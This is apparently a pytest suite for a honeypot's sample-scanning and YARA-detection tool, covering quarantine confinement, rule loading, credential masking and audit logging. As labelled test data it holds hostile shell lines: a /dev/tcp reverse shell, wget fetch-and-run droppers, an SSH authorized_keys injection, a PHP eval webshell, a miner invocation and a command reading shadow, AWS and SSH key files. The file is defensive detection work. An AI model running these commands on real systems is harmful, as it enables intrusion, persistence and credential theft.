"""`sample_scan` / `sample_collect`: a confined quarantine, YARA, and collection from containers.

Nothing here is real malware. Samples are crafted bytes (ELF headers carrying the strings a rule
looks for, shell text, a harmless marker only a test rule knows), written into a per-test
quarantine. Docker is a fake whose exec stream yields a tar the test builds, including hostile ones.
"""

from __future__ import annotations

import asyncio
import hashlib
import io
import json
import os
import re
import stat
import struct
import sys
import tarfile
from datetime import UTC, datetime, timedelta
from importlib import resources
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

os.environ["DATABASE_URL"] = os.environ.get("TEST_DATABASE_URL", "sqlite+aiosqlite:///:memory:")

ROOT = Path(__file__).resolve().parents[2]


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, get_session, init_db

    event_buffer.reset_for_tests()
    await init_db()
    async with get_session():
        pass
    yield
    await asyncio.sleep(0.05)
    event_buffer.reset_for_tests()
    await close_db()


@pytest.fixture(autouse=True)
def _clean_rule_cache():
    from honeypot_mcp import samples

    samples._RULE_CACHE.clear()
    yield
    samples._RULE_CACHE.clear()


@pytest.fixture
def engine():
    from honeypot_mcp import samples

    if samples.load_backend() is None:
        pytest.skip("no YARA engine installed (pip install 'honeypot-mcp[forensics]')")


# ── crafted samples ──────────────────────────────────────────────────────────────────────────


def make_elf(
    extra: bytes = b"",
    *,
    machine: int = 40,
    bits: int = 32,
    big: bool = False,
    interp: bool = False,
) -> bytes:
    order = ">" if big else "<"
    ident = b"\x7fELF" + bytes([1 if bits == 32 else 2, 2 if big else 1, 1]) + b"\x00" * 9
    p_type = 3 if interp else 1
    if bits == 32:
        header = struct.pack(
            order + "HHIIIIIHHHHHH", 2, machine, 1, 0x8000, 52, 0, 0, 52, 32, 1, 0, 0, 0
        )
        phdr = struct.pack(order + "8I", p_type, 0, 0x8000, 0, 0, 0, 5, 0x1000)
    else:
        header = struct.pack(
            order + "HHIQQQIHHHHHH", 2, machine, 1, 0x400000, 64, 0, 0, 64, 56, 1, 0, 0, 0
        )
        phdr = struct.pack(order + "IIQQQQQQ", p_type, 5, 0, 0x400000, 0, 0, 0, 0x1000)
    return ident + header + phdr + extra


ELF_SAMPLES = {
    "mirai": (
        make_elf(b"\x00/dev/watchdog\x00TSource Engine Query\x00"),
        "IoT_Mirai_Family_ELF",
        "high",
        "mirai",
    ),
    "gafgyt": (
        make_elf(b"\x00KILLATTK\x00LOLNOGTFO\x00"),
        "IoT_Gafgyt_Bashlite_ELF",
        "high",
        "gafgyt",
    ),
    "upx": (make_elf(b"\x00" * 64 + b"UPX!\x00" * 2), "ELF_UPX_Packed", "medium", "packed"),
    "loader": (
        make_elf(b"\x00/bin/sh\x00"),
        "ELF_Small_Static_Stripped_Loader",
        "low",
        "iot-loader-heuristic",
    ),
}

KEY_BLOB = "AAAAB3NzaC1yc2E" + "A" * 60
WALLET = "4A" + "B" * 93
TEXT_SAMPLES = {
    "busybox_probe": (b"cd /tmp\n/bin/busybox ECCHI\n", "IoT_Busybox_Applet_Probe_Script", "medium", "iot-dropper"),
    "busybox_chain": (
        b"cd /tmp; busybox wget http://192.0.2.7/x -O x; chmod 777 x; ./x\n",
        "IoT_Busybox_Fetch_Chain_Dropper", "high", "iot-dropper",
    ),
    "arch_script": (
        b"#!/bin/sh\n" + b"".join(
            f"wget http://192.0.2.7/bins/bot.{a}; chmod +x bot.{a}\n".encode()
            for a in ("arm", "arm7", "mips", "mpsl", "x86", "ppc")
        ),
        "IoT_Architecture_Suffix_Download_Script", "high", "iot-dropper",
    ),
    "echo_hex": (
        b"".join(b'echo -ne "\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00" >> .d\n' for _ in range(4)),
        "IoT_Echo_Hex_Dropper", "high", "echo-dropper",
    ),
    "fetch_run_delete": (
        b"cd /tmp; wget http://192.0.2.9/a.sh -O a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh\n",
        "Shell_Fetch_Chmod_Execute_Delete", "high", "dropper",
    ),
    "xmrig": (
        b"./xmrig --donate-level 1 -o stratum+tcp://pool.example.invalid:3333 -u x\n",
        "Miner_XMRig_Artefacts", "high", "xmrig",
    ),
    "stratum": (
        b"miner -o stratum+tcp://pool.example.invalid:3333\n",
        "Miner_Stratum_Pool_Reference", "medium", "generic-miner",
    ),
    "wallet": (
        f"pool config\n-u {WALLET}\n".encode(), "Miner_Monero_Wallet_With_Pool", "medium", "generic-miner"
    ),
    "reverse_shell": (
        b"bash -i >& /dev/tcp/192.0.2.50/4444 0>&1\n", "Shell_Reverse_Shell_Oneliner", "high", "reverse-shell"
    ),
    "ssh_key": (
        f'mkdir -p ~/.ssh; echo "ssh-rsa {KEY_BLOB} x" >> ~/.ssh/authorized_keys\n'.encode(),
        "Shell_SSH_Authorized_Keys_Injection", "high", "ssh-key-persistence",
    ),
    "php_shell": (
        b"<?php eval(base64_decode($_POST['x'])); ?>", "Webshell_PHP_Eval_Decode_Exec", "high", "php-webshell"
    ),
    "eval_stdin": (
        b"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1\n",
        "PHPUnit_Eval_Stdin_Reference", "medium", "phpunit-rce",
    ),
    "cred_theft": (
        b"cat /etc/shadow; cat ~/.aws/credentials; cat ~/.ssh/id_rsa\n",
        "Shell_Credential_Theft_Strings", "medium", "credential-theft",
    ),
    "exec_probe": (
        b'echo "echo hi" > /tmp/.t; chmod +x /tmp/.t; /tmp/.t; rm -f /tmp/.t\n',
        "Shell_Exec_Capability_Probe", "info", "capability-probe",
    ),
}  # fmt: skip
BENIGN = b"hello world\nthis is a note about a grocery list\nrm old.txt; chmod 644 new.txt\n"
MARKER = b"HONEYPOT-MCP-TEST-MARKER-0123456789"
MARKER_RULE = """\
rule Test_Marker
{
    meta:
        severity = "high"
        family = "test-marker"
        description = "harmless marker defined by the test"
    strings:
        $m = "HONEYPOT-MCP-TEST-MARKER-0123456789"
    condition:
        $m
}
"""


def quarantine() -> Path:
    from honeypot_mcp.config import get_settings

    root = get_settings().samples_dir
    root.mkdir(mode=0o700, parents=True, exist_ok=True)
    return root


def put(rel: str, data: bytes, mode: int = 0o000) -> Path:
    path = quarantine() / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    os.chmod(path, mode)
    return path


def sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def rules_dir() -> Path:
    from honeypot_mcp.config import get_settings

    path = get_settings().yara_rules_dir
    path.mkdir(mode=0o700, parents=True, exist_ok=True)
    return path


async def scan(**kwargs: Any) -> dict[str, Any]:
    from honeypot_mcp.tools.samples import sample_scan

    return await sample_scan(**kwargs)


def hits_of(result: dict[str, Any], path: str) -> list[dict[str, Any]]:
    table = json.loads(Path(result["artifact"]["path"]).read_text())
    return next(f for f in table["files"] if f["path"] == path)["hits"]


# ── the bundled rules ────────────────────────────────────────────────────────────────────────


def test_bundled_rules_resolve_from_the_package():
    directory = resources.files("honeypot_mcp") / "yara_rules"
    names = sorted(e.name for e in directory.iterdir() if e.name.endswith(".yar"))
    assert names == ["iot_botnets.yar", "miners.yar", "shells.yar", "webshells.yar"]
    assert all((directory / n).read_text(encoding="utf-8").strip() for n in names)


def test_the_wheel_ships_the_rules():
    import tomllib

    config = tomllib.loads((ROOT / "pyproject.toml").read_text())
    artifacts = config["tool"]["hatch"]["build"]["targets"]["wheel"]["artifacts"]
    assert "src/honeypot_mcp/yara_rules/*.yar" in artifacts


def test_every_bundled_rule_documents_itself():
    from honeypot_mcp import samples

    required = ("author", "description", "reference", "date", "severity", "family")
    seen = 0
    for rule_file in samples._bundled_rule_files():
        blocks = re.split(r"^rule ", rule_file.source, flags=re.M)[1:]
        for block in blocks:
            seen += 1
            name = block.split()[0]
            meta = dict(
                re.findall(r'^\s+(\w+) = "((?:[^"\\]|\\.)*)"$', block.split("strings:")[0], re.M)
            )
            for key in required:
                assert meta.get(key), f"{name}: meta {key} missing"
            assert meta["severity"] in samples.SEVERITIES, name
            assert meta["author"] == "HoneyPot-MCP"
            assert meta["reference"].startswith("https://attack.mitre.org/"), name
    assert seen == sum(f.rule_count for f in samples._bundled_rule_files()) >= 15


def _backends():
    import importlib

    from honeypot_mcp import samples

    out = []
    for module_name, cls in samples._BACKENDS:
        try:
            out.append(pytest.param(cls(importlib.import_module(module_name)), id=module_name))
        except ImportError:
            out.append(
                pytest.param(None, id=module_name, marks=pytest.mark.skip(reason="not installed"))
            )
    return out


def _detect(backend, data: bytes) -> dict[str, dict[str, Any]]:
    from honeypot_mcp import samples

    files = samples._bundled_rule_files()
    ruleset = samples.RuleSet(backend, backend.compile([(f.label, f.source) for f in files]), files)
    return {h["rule"]: h for h in samples.evaluate(ruleset, data)}


@pytest.mark.parametrize("backend", _backends())
@pytest.mark.parametrize("name", sorted({**ELF_SAMPLES, **TEXT_SAMPLES}))
def test_each_family_is_detected_with_its_severity_on_either_engine(backend, name):
    data, rule, severity, family = {**ELF_SAMPLES, **TEXT_SAMPLES}[name]
    hits = _detect(backend, data)
    assert rule in hits, f"{name}: got {sorted(hits)}"
    assert hits[rule]["severity"] == severity
    assert hits[rule]["family"] == family


@pytest.mark.parametrize("backend", _backends())
def test_benign_text_and_a_dynamic_elf_do_not_hit(backend):
    assert _detect(backend, BENIGN) == {}
    dynamic = make_elf(b"\x00/lib/ld-linux.so.3\x00/bin/sh\x00", interp=True)
    assert "ELF_Small_Static_Stripped_Loader" not in _detect(backend, dynamic)


@pytest.mark.parametrize("backend", _backends())
def test_the_execution_probe_is_info_and_not_a_dropper(backend):
    hits = _detect(backend, TEXT_SAMPLES["exec_probe"][0])
    assert set(hits) == {"Shell_Exec_Capability_Probe"}
    assert hits["Shell_Exec_Capability_Probe"]["severity"] == "info"
    # The same probe that fetches something is a dropper, not a probe.
    fetching = b"wget http://192.0.2.9/a -O /tmp/.t; chmod +x /tmp/.t; /tmp/.t; rm -f /tmp/.t\n"
    assert "Shell_Exec_Capability_Probe" not in _detect(backend, fetching)
    assert "Shell_Fetch_Chmod_Execute_Delete" in _detect(backend, fetching)


# ── type, entropy ────────────────────────────────────────────────────────────────────────────


def test_elf_architecture_and_linking_are_read_from_the_header():
    from honeypot_mcp.samples import detect_type

    arm = detect_type(make_elf())
    assert (arm["kind"], arm["arch"], arm["bits"], arm["endian"], arm["linking"]) == (
        "elf", "arm", 32, "little", "static",
    )  # fmt: skip
    mips = detect_type(make_elf(machine=8, big=True))
    assert (mips["arch"], mips["endian"]) == ("mips", "big")
    assert "big-endian" in mips["description"]
    amd = detect_type(make_elf(machine=62, bits=64, interp=True))
    assert (amd["arch"], amd["bits"], amd["linking"]) == ("x86-64", 64, "dynamic")
    assert detect_type(b"\x7fELF")["kind"] == "elf"  # truncated: described, not an exception


def test_other_types_by_magic():
    from honeypot_mcp.samples import detect_type

    assert detect_type(b"")["kind"] == "empty"
    assert detect_type(b"#!/bin/busybox sh\nid\n")["interpreter"] == "/bin/busybox sh"
    assert detect_type(b"\x1f\x8b\x08\x00" + b"\x00" * 20) == {
        "kind": "archive", "format": "gzip", "description": "gzip archive/compressed",
    }  # fmt: skip
    assert detect_type(b"plain words\n")["kind"] == "text"
    assert detect_type(bytes(range(256)) * 4)["kind"] == "data"
    tty = struct.pack("<iLiiLL", 1, 3, 0, 0, 1_760_000_000, 5) + b"\x00" * 40
    assert detect_type(tty)["kind"] == "tty_recording"


def test_entropy_buckets():
    from honeypot_mcp.samples import entropy_info

    assert entropy_info(b"\x00" * 4096)["bucket"] == "low"
    assert entropy_info(b"the quick brown fox jumps over the lazy dog " * 30)["bucket"] == "medium"
    assert entropy_info(os.urandom(1 << 16))["bucket"] == "packed_or_encrypted"
    assert entropy_info(b"")["bits_per_byte"] == 0.0


# ── confinement ──────────────────────────────────────────────────────────────────────────────


async def test_dotdot_is_refused_even_when_it_would_stay_inside(engine):
    put("a/inner.sh", BENIGN)
    for bad in ("../outside", "a/../a/inner.sh", "a/..", ".."):
        result = await scan(path=bad)
        assert "error" in result and "'..'" in result["error"], bad


async def test_absolute_paths_outside_are_refused_and_inside_are_accepted(engine, tmp_path):
    inside = put("honeypot-x/downloads/f", BENIGN)
    outside = tmp_path / "elsewhere.txt"
    outside.write_text("hello")
    refused = await scan(path=str(outside))
    assert "refusing to read outside the samples directory" in refused["error"]
    assert "files_scanned" not in refused
    assert (await scan(path="/etc/passwd"))["error"].startswith("refusing")
    accepted = await scan(path=str(inside))
    assert accepted["files_scanned"] == 1


async def test_a_symlink_that_escapes_is_refused_and_never_read(engine, tmp_path):
    secret = tmp_path / "secret.txt"
    secret.write_text("TOPSECRET")
    root = quarantine()
    (root / "link").symlink_to(secret)
    (root / "dir").mkdir()
    (root / "dir" / "inner").write_bytes(b"x")
    (root / "dirlink").symlink_to(tmp_path)
    for path in ("link", "dirlink", "dirlink/secret.txt"):
        result = await scan(path=path)
        assert "symbolic links are not followed" in result["error"], path
    # In a directory walk a link is reported as skipped, not followed.
    walked = await scan()
    assert walked["files_scanned"] == 1
    assert {s["path"] for s in walked["files_skipped"]["examples"]} == {"link", "dirlink"}
    assert walked["files_skipped"]["by_reason"] == {"symlink": 2}
    assert "TOPSECRET" not in json.dumps(walked)


async def test_a_symlink_inside_the_quarantine_is_refused_too(engine):
    put("real", BENIGN)
    (quarantine() / "alias").symlink_to(quarantine() / "real")
    assert "symbolic links" in (await scan(path="alias"))["error"]


async def test_special_files_are_skipped_not_opened(engine):
    os.mkfifo(quarantine() / "pipe")
    put("ok", BENIGN)
    result = await asyncio.wait_for(scan(), timeout=20)  # a FIFO opened blocking would hang
    assert result["files_scanned"] == 1
    assert result["files_skipped"]["by_reason"] == {"special file": 1}
    refused = await scan(path="pipe")
    assert "not a regular file or directory" in refused["error"]


async def test_a_file_over_the_size_cap_is_skipped_with_its_reason(engine, monkeypatch):
    from honeypot_mcp.config import get_settings

    monkeypatch.setattr(get_settings(), "sample_max_mb", 1)
    path = put("big", b"", mode=0o600)
    with path.open("r+b") as fh:
        fh.truncate((1 << 20) + 1)
    put("small", BENIGN)
    result = await scan()
    assert result["files_scanned"] == 1
    assert result["files_skipped"]["by_reason"] == {"over the size cap": 1}
    assert result["files_skipped"]["examples"][0]["path"] == "big"


async def test_missing_path_is_a_clear_error(engine):
    result = await scan(path="nope")
    assert "was not found" in result["error"] and result["hint"]


def test_the_quarantine_is_created_owner_only(tmp_path, monkeypatch):
    from honeypot_mcp import samples
    from honeypot_mcp.config import get_settings

    target = tmp_path / "fresh" / "samples"
    monkeypatch.setattr(get_settings(), "samples_dir", target)
    samples.quarantine_root()
    assert stat.S_IMODE(target.stat().st_mode) == 0o700


# ── mode-000 files ───────────────────────────────────────────────────────────────────────────


async def test_mode_000_files_are_read_and_left_exactly_as_they_were(engine):
    data = TEXT_SAMPLES["fetch_run_delete"][0]
    path = put("honeypot-x/downloads/dropper", data, mode=0o000)
    os.utime(path, (1_700_000_000, 1_700_000_000))
    before = path.stat()
    result = await scan()
    after = path.stat()
    assert result["files_scanned"] == 1 and result["files_skipped"]["count"] == 0
    assert stat.S_IMODE(after.st_mode) == 0
    assert (after.st_mtime_ns, after.st_size, after.st_ino) == (
        before.st_mtime_ns, before.st_size, before.st_ino,
    )  # fmt: skip
    entry = result["top_files"][0]
    assert entry["sha256"] == sha(data) and entry["size"] == len(data)
    assert entry["hits"][0]["rule"] == "Shell_Fetch_Chmod_Execute_Delete"
    os.chmod(path, 0o600)
    assert path.read_bytes() == data  # content untouched


class _OsProxy:
    """`samples.os` with a few attributes replaced, so a test can fail one call without
    patching the process-wide `os` module that pytest itself uses."""

    def __init__(self, **overrides: Any) -> None:
        self._overrides = overrides

    def __getattr__(self, name: str) -> Any:
        return self._overrides.get(name, getattr(os, name))


async def test_the_mode_is_restored_when_the_read_fails_midway(engine, monkeypatch):
    from honeypot_mcp import samples

    path = put("victim", BENIGN, mode=0o000)

    def swapped(fd):
        fields = list(tuple(os.fstat(fd)))
        fields[1] += 1  # a different inode: the file was swapped after it was inspected
        return os.stat_result(fields)

    monkeypatch.setattr(samples, "os", _OsProxy(fstat=swapped))
    with pytest.raises(samples.SkipFile, match="changed while being read"):
        samples.read_sample(path, 1 << 20)
    assert stat.S_IMODE(path.stat().st_mode) == 0


async def test_a_file_owned_by_someone_else_is_skipped_not_changed(engine, monkeypatch):
    from honeypot_mcp import samples

    path = put("theirs", BENIGN, mode=0o000)
    monkeypatch.setattr(samples, "os", _OsProxy(geteuid=lambda: path.stat().st_uid + 1))
    result = await scan()
    assert result["files_scanned"] == 0
    assert result["files_skipped"]["by_reason"] == {"not readable and not owned by this user": 1}
    assert stat.S_IMODE(path.stat().st_mode) == 0


async def test_the_reader_does_not_leave_a_scratch_copy_of_the_sample(engine, tmp_path):
    put("a", MARKER)
    before = {p for p in tmp_path.rglob("*") if p.is_file()}
    await scan()
    created = {p for p in tmp_path.rglob("*") if p.is_file()} - before
    assert {p.parent.name for p in created} == {"reports"}  # only the artifact
    assert MARKER not in b"".join(p.read_bytes() for p in created)


# ── results ──────────────────────────────────────────────────────────────────────────────────


async def test_digest_counts_hits_by_rule_family_and_severity(engine):
    put("h/downloads/mirai", ELF_SAMPLES["mirai"][0])
    put("h/downloads/upx", ELF_SAMPLES["upx"][0])
    put("h/downloads/dropper", TEXT_SAMPLES["fetch_run_delete"][0])
    put("h/downloads/benign", BENIGN)
    put("h/downloads/empty", b"")
    put("h/downloads/blob", bytes(range(256)) * 8)
    result = await scan()
    assert result["files_scanned"] == 6
    assert result["files_with_hits"] == 3 and result["files_without_hits"] == 3
    assert result["hits_by_severity"]["high"] == 2 and result["hits_by_severity"]["medium"] == 1
    assert {"mirai", "dropper", "packed"} <= set(result["hits_by_family"])
    rules = {r["rule"]: r for r in result["hits_by_rule"]}
    assert rules["IoT_Mirai_Family_ELF"]["files"] == 1
    assert result["by_type"]["elf"] == 2 and result["by_type"]["empty"] == 1
    assert result["by_type"]["data"] == 1
    assert result["unknown_type_files"] == 1
    assert result["elf_architectures"] == {"arm": 2}
    # Most significant first: high before medium.
    assert [f["hits"][0]["severity"] for f in result["top_files"]] == ["high", "high", "medium"]
    assert result["rules"]["errors"] == [] and result["engine"] in ("yara-python", "yara-x")


async def test_duplicates_are_grouped_by_hash(engine):
    put("a/downloads/one", BENIGN)
    put("b/downloads/two", BENIGN)
    put("b/downloads/other", BENIGN + b"x")
    result = await scan()
    assert result["distinct_hashes"] == 2
    assert result["duplicates"]["groups"] == 1
    group = result["duplicates"]["examples"][0]
    assert group["copies"] == 2 and group["sha256"] == sha(BENIGN)
    assert sorted(group["paths"]) == ["a/downloads/one", "b/downloads/two"]


async def test_the_per_call_file_limit_is_reported(engine, monkeypatch):
    from honeypot_mcp.config import get_settings

    monkeypatch.setattr(get_settings(), "sample_scan_max_files", 2)
    for i in range(5):
        put(f"d/f{i}", f"text {i}\n".encode())
    result = await scan()
    assert result["files_scanned"] == 2
    assert result["truncated"]["files_not_scanned"] == 3
    assert "SAMPLE_SCAN_MAX_FILES" in result["truncated"]["note"]


async def test_metadata_files_and_partial_collect_files_are_not_samples(engine):
    put("README.txt", b"warning", mode=0o600)
    put("SHA256SUMS", b"", mode=0o600)
    put("h/downloads/.collect-abc.part", b"half", mode=0o600)
    put("h/downloads/real", BENIGN)
    result = await scan()
    assert result["files_scanned"] == 1 and result["files_skipped"]["count"] == 0


async def test_matched_strings_report_offsets_and_a_short_printable_excerpt_only(engine):
    long_url = "http://192.0.2.9/" + "a" * 200 + ".sh"
    body = (
        b"\x00\x01SECRET-NOT-MATCHED-PAYLOAD\x02\n"
        + f"cd /tmp; wget {long_url} -O a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh\n".encode()
        + b"\xff\xfe"
    )
    put("h/downloads/x", body)
    result = await scan()
    artifact_text = Path(result["artifact"]["path"]).read_text()
    everything = json.dumps(result) + artifact_text
    assert "SECRET-NOT-MATCHED-PAYLOAD" not in everything
    assert long_url not in everything  # clipped
    hit = result["top_files"][0]["hits"][0]
    assert hit["rule"] == "Shell_Fetch_Chmod_Execute_Delete"
    for string in hit["strings"]:
        assert re.fullmatch(r"\$\w+", string["id"])
        assert all(isinstance(o, int) and 0 <= o < len(body) for o in string["offsets"])
        assert len(string["excerpt"]) <= 64
        assert all(32 <= ord(c) < 127 for c in string["excerpt"])
    assert "\\u0000" not in everything and "\\x00" not in everything


async def test_the_full_table_goes_to_a_file_in_the_reports_directory(engine):
    from honeypot_mcp.config import get_settings

    put("h/downloads/x", TEXT_SAMPLES["reverse_shell"][0])
    result = await scan()
    artifact = Path(result["artifact"]["path"])
    assert artifact.parent == get_settings().reports_dir
    assert artifact.name.startswith("sample-scan") and artifact.suffix == ".json"
    table = json.loads(artifact.read_text())
    assert table["files"][0]["sha256"] == sha(TEXT_SAMPLES["reverse_shell"][0])
    assert table["files"][0]["entropy"]["bucket"] in (
        "low",
        "medium",
        "high",
        "packed_or_encrypted",
    )
    assert str(get_settings().samples_dir) not in artifact.read_text()  # relative paths only


async def test_top_limits_the_detail_not_the_counts(engine):
    for i in range(4):
        put(f"h/{i}", TEXT_SAMPLES["reverse_shell"][0] + str(i).encode())
    result = await scan(top=2)
    assert result["files_with_hits"] == 4 and len(result["top_files"]) == 2


async def test_scanning_one_file_or_one_directory(engine):
    put("a/x", TEXT_SAMPLES["reverse_shell"][0])
    put("b/y", BENIGN)
    assert (await scan(path="a/x"))["files_scanned"] == 1
    assert (await scan(path="b"))["files_with_hits"] == 0
    assert (await scan(path=str(quarantine() / "a")))["files_with_hits"] == 1


# ── user rules ───────────────────────────────────────────────────────────────────────────────


async def test_a_user_rule_loads_in_addition_to_the_bundled_ones(engine):
    (rules_dir() / "marker.yar").write_text(MARKER_RULE)
    put("h/marker", b"junk " + MARKER + b" junk")
    put("h/dropper", TEXT_SAMPLES["fetch_run_delete"][0])
    result = await scan()
    assert result["rules"]["user"] == ["marker.yar"]
    assert "iot_botnets" in result["rules"]["bundled"]
    by_path = {
        f["path"]: f for f in json.loads(Path(result["artifact"]["path"]).read_text())["files"]
    }
    marker_hit = by_path["h/marker"]["hits"][0]
    assert (marker_hit["rule"], marker_hit["severity"], marker_hit["family"]) == (
        "Test_Marker", "high", "test-marker",
    )  # fmt: skip
    assert marker_hit["source"] == "user:marker.yar"
    assert marker_hit["strings"][0]["offsets"] == [5]
    assert by_path["h/dropper"]["hits"][0]["rule"] == "Shell_Fetch_Chmod_Execute_Delete"


async def test_a_broken_user_rule_names_its_file_and_line_and_disables_nothing(engine):
    (rules_dir() / "good.yar").write_text(MARKER_RULE)
    (rules_dir() / "broken.yar").write_text(
        'rule Broken\n{\n    strings:\n        $a = "x"\n    condition:\n        $a and nonsense_identifier\n}\n'
    )
    put("h/marker", MARKER)
    put("h/dropper", TEXT_SAMPLES["fetch_run_delete"][0])
    result = await scan()
    errors = result["rules"]["errors"]
    assert len(errors) == 1
    assert errors[0]["file"] == "user:broken.yar"
    assert errors[0]["line"] == 6
    assert "nonsense_identifier" in errors[0]["message"]
    assert result["rules"]["user"] == ["good.yar"]
    assert result["files_with_hits"] == 2  # the bundled rule and the good user rule both still fire
    # Fixing the file takes effect on the next call (the cache is keyed on the content).
    (rules_dir() / "broken.yar").write_text(
        'rule Broken\n{\n    strings:\n        $a = "x"\n    condition:\n        $a\n}\n'
    )
    fixed = await scan()
    assert fixed["rules"]["errors"] == [] and fixed["rules"]["user"] == ["broken.yar", "good.yar"]


async def test_user_rule_files_that_are_links_or_oversized_are_reported_not_loaded(
    engine, tmp_path
):
    outside = tmp_path / "evil.yar"
    outside.write_text(MARKER_RULE)
    (rules_dir() / "link.yar").symlink_to(outside)
    (rules_dir() / "huge.yar").write_text("/*" + "x" * (1 << 20) + "*/")
    put("h/a", BENIGN)
    result = await scan()
    assert result["rules"]["user"] == []
    assert {e["file"] for e in result["rules"]["errors"]} == {"user:link.yar", "user:huge.yar"}


async def test_includes_in_a_user_rule_cannot_read_other_files(engine, tmp_path):
    other = tmp_path / "other.yar"
    other.write_text(MARKER_RULE)
    (rules_dir() / "inc.yar").write_text(f'include "{other}"\n')
    put("h/a", MARKER)
    result = await scan()
    assert [e["file"] for e in result["rules"]["errors"]] == ["user:inc.yar"]
    assert result["files_with_hits"] == 0


async def test_rule_selection_narrows_the_scan_and_rejects_unknown_names(engine):
    put("h/miner", TEXT_SAMPLES["xmrig"][0])
    put("h/shell", TEXT_SAMPLES["reverse_shell"][0])
    only = await scan(rules="miners")
    assert only["rules"]["bundled"] == ["miners"]
    assert {r["rule"] for r in only["hits_by_rule"]} <= {
        "Miner_XMRig_Artefacts", "Miner_Stratum_Pool_Reference"
    }  # fmt: skip
    assert only["files_with_hits"] == 1
    unknown = await scan(rules="nonexistent")
    assert "nonexistent" in unknown["error"] and "miners" in unknown["hint"]


async def test_rules_are_compiled_once_and_reused(engine, monkeypatch):
    from honeypot_mcp import samples

    put("h/a", BENIGN)
    calls = []
    backend_cls = type(samples.load_backend())
    real = backend_cls.compile

    def counting(self, units):
        calls.append(1)
        return real(self, units)

    monkeypatch.setattr(backend_cls, "compile", counting)
    await scan()
    await scan()
    await scan()
    assert len(calls) == 1


# ── engine availability ──────────────────────────────────────────────────────────────────────


async def test_without_a_yara_engine_the_tool_degrades_instead_of_failing(monkeypatch):
    monkeypatch.setitem(sys.modules, "yara", None)
    monkeypatch.setitem(sys.modules, "yara_x", None)
    put("h/a", BENIGN)
    result = await scan()
    assert result["available"] is False
    assert "forensics" in result["note"]
    assert "error" not in result


async def test_yara_x_is_used_when_yara_python_is_missing(monkeypatch):
    pytest.importorskip("yara_x")
    monkeypatch.setitem(sys.modules, "yara", None)
    put("h/a", TEXT_SAMPLES["reverse_shell"][0])
    result = await scan()
    assert result["engine"] == "yara-x" and result["files_with_hits"] == 1


# ── the database join ────────────────────────────────────────────────────────────────────────


async def _seed(event_type: str, ip: str, payload: dict[str, Any], age_minutes: int = 0) -> None:
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert, AlertSeverity

    async with get_session() as session:
        session.add(
            Alert(
                source_ip=ip,
                event_type=event_type,
                payload=payload,
                severity=AlertSeverity.CRITICAL,
                timestamp=datetime.now(UTC) - timedelta(minutes=age_minutes),
            )
        )


async def test_hashes_found_in_the_database_carry_their_capture_context(engine):
    fetched = TEXT_SAMPLES["fetch_run_delete"][0]
    typed = TEXT_SAMPLES["reverse_shell"][0]
    put("h/downloads/fetched", fetched)
    put("h/downloads/typed", typed)
    put("h/downloads/unknown", BENIGN)
    url = "http://192.0.2.9/a.sh"
    await _seed("ssh_file_download", "198.51.100.1",
                {"shasum": sha(fetched), "url": url, "destfile": "/tmp/a.sh", "message": "Downloaded URL"}, 30)  # fmt: skip
    await _seed("ssh_file_download", "198.51.100.2",
                {"shasum": sha(fetched), "url": url, "destfile": "/tmp/a.sh"}, 10)  # fmt: skip
    await _seed("telnet_file_download", "198.51.100.1",
                {"shasum": sha(typed), "destfile": "/root/f", "message": "Saved redir contents with SHA-256 x"})  # fmt: skip
    await _seed("ssh_file_download", "198.51.100.3", {"shasum": "0" * 64, "url": url})
    result = await scan()
    files = {
        f["path"]: f for f in json.loads(Path(result["artifact"]["path"]).read_text())["files"]
    }
    net = files["h/downloads/fetched"]["database"]
    assert net["events"] == 2 and net["distinct_sources"] == 2
    assert net["origin"] == "fetched_from_network" and net["fetched_from_network"] == 2
    assert net["written_by_session"] == 0
    assert net["destination_names"] == ["/tmp/a.sh"] and net["source_urls"] == [url]
    assert net["first_seen"] < net["last_seen"]
    redir = files["h/downloads/typed"]["database"]
    assert redir["origin"] == "written_by_session" and redir["written_by_session"] == 1
    assert redir["event_types"] == {"telnet_file_download": 1}
    assert files["h/downloads/unknown"]["database"] is None
    assert result["database"]["files_with_context"] == 2
    top = {f["path"]: f for f in result["top_files"]}
    assert top["h/downloads/fetched"]["database"]["distinct_sources"] == 2


async def test_a_planted_credential_is_masked_in_the_capture_context(engine):
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeytoken, HoneytokenType

    body = TEXT_SAMPLES["fetch_run_delete"][0]
    put("h/f", body)
    async with get_session() as session:
        session.add(
            Honeytoken(
                type=HoneytokenType.CREDENTIAL,
                label="planted",
                token_value="x",
                token_meta={"credentials": [{"username": "u", "password": "Sup3rPlanted!"}]},
            )
        )
    await _seed("ssh_file_download", "198.51.100.1",
                {"shasum": sha(body), "destfile": "/tmp/Sup3rPlanted!.sh", "url": "http://192.0.2.9/x"})  # fmt: skip
    result = await scan()
    assert "Sup3rPlanted!" not in json.dumps(result)
    assert "masked: planted honeytoken" in json.dumps(result)


# ── audit and tiers ──────────────────────────────────────────────────────────────────────────


async def test_a_scan_and_a_refusal_are_both_audited(engine):
    from sqlalchemy import select

    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import AuditLog

    put("h/a", BENIGN)
    await scan()
    await scan(path="../x")
    async with get_session() as session:
        rows = (
            (await session.execute(select(AuditLog).where(AuditLog.tool == "sample_scan")))
            .scalars()
            .all()
        )
    assert sorted(r.outcome for r in rows) == ["error", "ok"]


def test_scan_is_operator_tier_and_collect_is_admin_tier():
    from honeypot_mcp import rbac

    assert "sample_scan" in rbac.OPERATOR_TOOLS and "sample_scan" not in rbac.ADMIN_TOOLS
    assert "sample_collect" in rbac.ADMIN_TOOLS and "sample_collect" not in rbac.OPERATOR_TOOLS


async def test_the_scan_description_points_at_lookup_hash():
    from honeypot_mcp.server import mcp

    tools = {t.name: t for t in await mcp.list_tools()}
    assert "lookup_hash" in tools["sample_scan"].description


# ── collection from containers ───────────────────────────────────────────────────────────────

COWRIE_ROOT = "/cowrie/cowrie-git/var/lib/cowrie"


